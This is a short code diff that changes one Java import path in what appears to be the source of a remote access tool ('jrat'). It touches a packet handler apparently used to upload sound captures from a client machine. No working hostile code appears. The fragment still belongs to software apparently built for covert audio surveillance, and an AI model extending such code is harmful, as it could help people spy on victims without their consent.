@@ -1,6 +1,6 @@
 package jrat.client.packets.incoming;
 
-import io.jrat.common.SoundWriter;
+import jrat.common.SoundWriter;
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet58ClientUploadSoundCapture;
 
